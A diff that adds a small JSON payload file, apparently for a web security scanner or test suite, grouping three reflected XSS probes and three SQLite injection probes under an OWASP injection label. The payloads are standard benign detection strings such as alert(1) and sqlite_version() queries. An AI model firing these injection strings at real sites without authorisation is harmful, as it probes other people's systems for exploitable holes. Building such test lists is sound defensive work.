@@ -1,0 +1,20 @@
+{
+  "reflected_xss": {
+    "owasp": "A03:2023-Injection",
+    "notes": "Reflected XSS variations",
+    "payloads": [
+      "<script>alert(1)</script>",
+      "\"'><svg/onload=alert(1)>",
+      "<img src=x onerror=alert(1)>"
+    ]
+  },
+  "sqlite": {
+    "owasp": "A03:2023-Injection",
+    "notes": "SQLite probes",
+    "payloads": [
+      "1' OR '1'='1' --",
+      "'; SELECT sqlite_version() --",
+      "' OR EXISTS(SELECT 1 FROM sqlite_master) --"
+    ]
+  }
+}
